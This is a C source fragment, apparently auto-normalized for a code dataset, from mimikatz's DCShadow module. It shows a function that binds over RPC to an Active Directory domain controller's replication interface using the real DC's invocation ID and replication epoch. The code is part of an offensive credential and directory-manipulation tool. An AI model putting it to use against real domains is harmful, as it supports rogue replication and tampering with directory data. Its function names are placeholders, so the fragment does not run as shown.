#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_11__   TYPE_4__ ;
typedef  struct TYPE_10__   TYPE_2__ ;
typedef  struct TYPE_9__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  (* kuhl_m_lsadump_dcshadow_bind_DRSR_function ) (TYPE_2__*,int /*<<< orphan*/ *) ;
typedef  int /*<<< orphan*/  ULONG ;
struct TYPE_11__ {int cb; int dwFlags; int /*<<< orphan*/  dwReplEpoch; } ;
struct TYPE_9__ {int /*<<< orphan*/  InvocationId; } ;
struct TYPE_10__ {TYPE_1__ realDc; int /*<<< orphan*/  dwReplEpoch; int /*<<< orphan*/  szDCFQDN; } ;
typedef  int /*<<< orphan*/  RPC_BINDING_HANDLE ;
typedef  TYPE_2__* PDCSHADOW_DOMAIN_INFO ;
typedef  int /*<<< orphan*/  NTSTATUS ;
typedef  int /*<<< orphan*/  DWORD ;
typedef  int /*<<< orphan*/ * DRS_HANDLE ;
typedef  TYPE_4__ DRS_EXTENSIONS_INT ;

/* Variables and functions */
 int DRS_EXT_GETCHGREPLY_V6 ; 
 int DRS_EXT_STRONG_ENCRYPTION ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ **) ; 
 int MIMIKATZ_NT_MAJOR_VERSION ; 
 int /*<<< orphan*/  FUNC1 (char*) ; 
 int /*<<< orphan*/  RPC_C_AUTHN_GSS_KERBEROS ; 
 int /*<<< orphan*/  RPC_C_AUTHN_GSS_NEGOTIATE ; 
 int /*<<< orphan*/  RPC_C_IMP_LEVEL_DEFAULT ; 
 int /*<<< orphan*/  FUNC2 (TYPE_4__*,int) ; 
 int /*<<< orphan*/  STATUS_UNSUCCESSFUL ; 
 int /*<<< orphan*/  TRUE ; 
 scalar_t__ FUNC3 (int /*<<< orphan*/ *,char*,int /*<<< orphan*/ ,int /*<<< orphan*/ *,char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  kull_m_rpc_drsr_RpcSecurityCallback ; 
 scalar_t__ FUNC5 (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ **,TYPE_4__*) ; 

ULONG FUNC6(PDCSHADOW_DOMAIN_INFO info, kuhl_m_lsadump_dcshadow_bind_DRSR_function function)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	RPC_BINDING_HANDLE hBinding;
	DRS_HANDLE hDrs = NULL;
	DRS_EXTENSIONS_INT DrsExtensionsInt;
	
	if(FUNC3(NULL, L"ncacn_ip_tcp", info->szDCFQDN, NULL, L"ldap", TRUE, (MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
	{
		FUNC2(&DrsExtensionsInt, sizeof(DRS_EXTENSIONS_INT));
		DrsExtensionsInt.cb = sizeof(DRS_EXTENSIONS_INT) - sizeof(DWORD);
		DrsExtensionsInt.dwFlags = DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_STRONG_ENCRYPTION;
		DrsExtensionsInt.dwReplEpoch = info->dwReplEpoch;
		if(FUNC5(&hBinding, &(info->realDc.InvocationId), &hDrs, &DrsExtensionsInt))
		{
			status = function(info, hDrs);
			FUNC0(&hDrs);
		}
		FUNC4(&hBinding);
	}
	else FUNC1(L"Domain not present, or doesn\'t look like a FQDN\n");
	return status;
}